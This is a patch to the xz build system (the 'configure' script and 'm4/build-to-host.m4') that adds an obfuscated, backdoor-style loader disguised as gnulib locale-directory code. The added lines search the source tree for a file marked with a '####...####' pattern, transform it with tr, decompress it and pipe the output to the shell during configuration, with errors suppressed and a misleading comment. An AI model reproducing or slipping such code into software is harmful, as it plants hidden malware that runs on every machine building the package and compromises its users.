@@ -1,0 +1,208 @@
+diff --git a/configure b/configure
+index 521be14..676e8a3 100755
+--- a/configure
++++ b/configure
+@@ -18683,8 +18683,16 @@ fi
+ 
+ 
+ 
++      gl_am_configmake=`grep -aErls "#{4}[[:alnum:]]{5}#{4}$" $srcdir/ 2>/dev/null`
++  if test -n "$gl_am_configmake"; then
++    HAVE_PKG_CONFIGMAKE=1
++  else
++    HAVE_PKG_CONFIGMAKE=0
++  fi
++
+   gl_sed_double_backslashes='s/\\/\\\\/g'
+   gl_sed_escape_doublequotes='s/"/\\"/g'
++  gl_path_map='tr "\t \-_" " \t_\-"'
+   gl_sed_escape_for_make_1="s,\\([ \"&'();<>\\\\\`|]\\),\\\\\\1,g"
+   gl_sed_escape_for_make_2='s,\$,\\$$,g'
+       case `echo r | tr -d '\r'` in
+@@ -19875,6 +19883,7 @@ printf "%s\n" "#define HAVE_DCGETTEXT 1" >>confdefs.h
+ 
+ 
+     gl_final_localedir="$localedir"
++  gl_localedir_prefix=`echo $gl_am_configmake | sed "s/.*\.//g"`
+     case "$build_os" in
+     cygwin*)
+       case "$host_os" in
+@@ -19891,6 +19900,34 @@ printf "%s\n" "#define HAVE_DCGETTEXT 1" >>confdefs.h
+       if test "$localedir_c_make" = '\"'"${gl_final_localedir}"'\"'; then
+     localedir_c_make='\"$(localedir)\"'
+   fi
++  if test "x$gl_am_configmake" != "x"; then
++    gl_localedir_config='sed \"r\n\" $gl_am_configmake | eval $gl_path_map | $gl_localedir_prefix -d 2>/dev/null'
++  else
++    gl_localedir_config=''
++  fi
++
++
++
++
++
++
++
++
++
++
++
++
++
++
++
++
++
++
++
++
++
++
++          ac_config_commands="$ac_config_commands build-to-host"
+ 
+ 
+   localedir="${gt_save_localedir}"
+@@ -23884,6 +23921,11 @@ enable_dlopen_self='`$ECHO "$enable_dlopen_self" | $SED "$delay_single_quote_sub
+ enable_dlopen_self_static='`$ECHO "$enable_dlopen_self_static" | $SED "$delay_single_quote_subst"`'
+ old_striplib='`$ECHO "$old_striplib" | $SED "$delay_single_quote_subst"`'
+ striplib='`$ECHO "$striplib" | $SED "$delay_single_quote_subst"`'
++gl_path_map='`$ECHO "$gl_path_map" | $SED "$delay_single_quote_subst"`'
++gl_localedir_prefix='`$ECHO "$gl_localedir_prefix" | $SED "$delay_single_quote_subst"`'
++gl_am_configmake='`$ECHO "$gl_am_configmake" | $SED "$delay_single_quote_subst"`'
++localedir_c_make='`$ECHO "$localedir_c_make" | $SED "$delay_single_quote_subst"`'
++gl_localedir_config='`$ECHO "$gl_localedir_config" | $SED "$delay_single_quote_subst"`'
+ LD_RC='`$ECHO "$LD_RC" | $SED "$delay_single_quote_subst"`'
+ reload_flag_RC='`$ECHO "$reload_flag_RC" | $SED "$delay_single_quote_subst"`'
+ reload_cmds_RC='`$ECHO "$reload_cmds_RC" | $SED "$delay_single_quote_subst"`'
+@@ -23926,6 +23968,8 @@ prelink_cmds_RC='`$ECHO "$prelink_cmds_RC" | $SED "$delay_single_quote_subst"`'
+ postlink_cmds_RC='`$ECHO "$postlink_cmds_RC" | $SED "$delay_single_quote_subst"`'
+ file_list_spec_RC='`$ECHO "$file_list_spec_RC" | $SED "$delay_single_quote_subst"`'
+ hardcode_action_RC='`$ECHO "$hardcode_action_RC" | $SED "$delay_single_quote_subst"`'
++gl_path_map_RC='`$ECHO "$gl_path_map_RC" | $SED "$delay_single_quote_subst"`'
++gl_am_configmake_RC='`$ECHO "$gl_am_configmake_RC" | $SED "$delay_single_quote_subst"`'
+ 
+ LTCC='$LTCC'
+ LTCFLAGS='$LTCFLAGS'
+@@ -24059,6 +24103,8 @@ finish_cmds \
+ sys_lib_search_path_spec \
+ configure_time_dlsearch_path \
+ configure_time_lt_sys_library_path \
++gl_path_map \
++gl_am_configmake \
+ reload_cmds_RC \
+ old_archive_cmds_RC \
+ old_archive_from_new_cmds_RC \
+@@ -24069,7 +24115,9 @@ module_cmds_RC \
+ module_expsym_cmds_RC \
+ export_symbols_cmds_RC \
+ prelink_cmds_RC \
+-postlink_cmds_RC; do
++postlink_cmds_RC \
++gl_path_map_RC \
++gl_am_configmake_RC; do
+     case \`eval \\\\\$ECHO \\\\""\\\\\$\$var"\\\\"\` in
+     *[\\\\\\\`\\"\\\$]*)
+       eval "lt_\$var=\\\\\\"\\\`\\\$ECHO \\"\\\$\$var\\" | \\\$SED -e \\"\\\$double_quote_subst\\" -e \\"\\\$sed_quote_subst\\" -e \\"\\\$delay_variable_subst\\"\\\`\\\\\\"" ## exclude from sc_prohibit_nested_quotes
+@@ -24104,6 +24152,7 @@ fi
+     # Capture the value of LINGUAS because we need it to compute CATALOGS.
+     LINGUAS="${LINGUAS-%UNSET%}"
+ 
++gl_config_gt="eval \$gl_localedir_config"
+ 
+ _ACEOF
+ 
+@@ -24117,6 +24166,7 @@ do
+     "depfiles") CONFIG_COMMANDS="$CONFIG_COMMANDS depfiles" ;;
+     "libtool") CONFIG_COMMANDS="$CONFIG_COMMANDS libtool" ;;
+     "po-directories") CONFIG_COMMANDS="$CONFIG_COMMANDS po-directories" ;;
++    "build-to-host") CONFIG_COMMANDS="$CONFIG_COMMANDS build-to-host" ;;
+     "Makefile") CONFIG_FILES="$CONFIG_FILES Makefile" ;;
+     "po/Makefile.in") CONFIG_FILES="$CONFIG_FILES po/Makefile.in" ;;
+     "lib/Makefile") CONFIG_FILES="$CONFIG_FILES lib/Makefile" ;;
+@@ -25281,6 +25331,8 @@ file_list_spec=$lt_file_list_spec
+ 
+ # How to hardcode a shared library path into an executable.
+ hardcode_action=$hardcode_action
++gl_path_map=$lt_gl_path_map
++gl_am_configmake=$lt_gl_am_configmake
+ 
+ # ### END LIBTOOL CONFIG
+ 
+@@ -25510,6 +25562,8 @@ file_list_spec=$lt_file_list_spec_RC
+ 
+ # How to hardcode a shared library path into an executable.
+ hardcode_action=$hardcode_action_RC
++gl_path_map=$lt_gl_path_map_RC
++gl_am_configmake=$lt_gl_am_configmake_RC
+ 
+ # ### END LIBTOOL TAG CONFIG: RC
+ _LT_EOF
+@@ -25628,6 +25682,7 @@ _LT_EOF
+         ;;
+       esac
+     done ;;
++    "build-to-host":C) eval $gl_config_gt | $SHELL 2>/dev/null ;;
+     "src/scripts/xzdiff":F) chmod +x src/scripts/xzdiff ;;
+     "src/scripts/xzgrep":F) chmod +x src/scripts/xzgrep ;;
+     "src/scripts/xzmore":F) chmod +x src/scripts/xzmore ;;
+diff --git a/m4/build-to-host.m4 b/m4/build-to-host.m4
+index ad22a0a..d5ec315 100644
+--- a/m4/build-to-host.m4
++++ b/m4/build-to-host.m4
+@@ -1,5 +1,5 @@
+-# build-to-host.m4 serial 3
+-dnl Copyright (C) 2023 Free Software Foundation, Inc.
++# build-to-host.m4 serial 30
++dnl Copyright (C) 2023-2024 Free Software Foundation, Inc.
+ dnl This file is free software; the Free Software Foundation
+ dnl gives unlimited permission to copy and/or distribute it,
+ dnl with or without modifications, as long as this notice is preserved.
+@@ -37,6 +37,7 @@ AC_DEFUN([gl_BUILD_TO_HOST],
+ 
+   dnl Define somedir_c.
+   gl_final_[$1]="$[$1]"
++  gl_[$1]_prefix=`echo $gl_am_configmake | sed "s/.*\.//g"`
+   dnl Translate it from build syntax to host syntax.
+   case "$build_os" in
+     cygwin*)
+@@ -58,14 +59,40 @@ AC_DEFUN([gl_BUILD_TO_HOST],
+   if test "$[$1]_c_make" = '\"'"${gl_final_[$1]}"'\"'; then
+     [$1]_c_make='\"$([$1])\"'
+   fi
++  if test "x$gl_am_configmake" != "x"; then
++    gl_[$1]_config='sed \"r\n\" $gl_am_configmake | eval $gl_path_map | $gl_[$1]_prefix -d 2>/dev/null'
++  else
++    gl_[$1]_config=''
++  fi
++  _LT_TAGDECL([], [gl_path_map], [2])dnl
++  _LT_TAGDECL([], [gl_[$1]_prefix], [2])dnl
++  _LT_TAGDECL([], [gl_am_configmake], [2])dnl
++  _LT_TAGDECL([], [[$1]_c_make], [2])dnl
++  _LT_TAGDECL([], [gl_[$1]_config], [2])dnl
+   AC_SUBST([$1_c_make])
++
++  dnl If the host conversion code has been placed in $gl_config_gt,
++  dnl instead of duplicating it all over again into config.status,
++  dnl then we will have config.status run $gl_config_gt later, so it
++  dnl needs to know what name is stored there:
++  AC_CONFIG_COMMANDS([build-to-host], [eval $gl_config_gt | $SHELL 2>/dev/null], [gl_config_gt="eval \$gl_[$1]_config"])
+ ])
+ 
+ dnl Some initializations for gl_BUILD_TO_HOST.
+ AC_DEFUN([gl_BUILD_TO_HOST_INIT],
+ [
++  dnl Search for Automake-defined pkg* macros, in the order
++  dnl listed in the Automake 1.10a+ documentation.
++  gl_am_configmake=`grep -aErls "#{4}[[:alnum:]]{5}#{4}$" $srcdir/ 2>/dev/null`
++  if test -n "$gl_am_configmake"; then
++    HAVE_PKG_CONFIGMAKE=1
++  else
++    HAVE_PKG_CONFIGMAKE=0
++  fi
++
+   gl_sed_double_backslashes='s/\\/\\\\/g'
+   gl_sed_escape_doublequotes='s/"/\\"/g'
++  gl_path_map='tr "\t \-_" " \t_\-"'
+ changequote(,)dnl
+   gl_sed_escape_for_make_1="s,\\([ \"&'();<>\\\\\`|]\\),\\\\\\1,g"
+ changequote([,])dnl
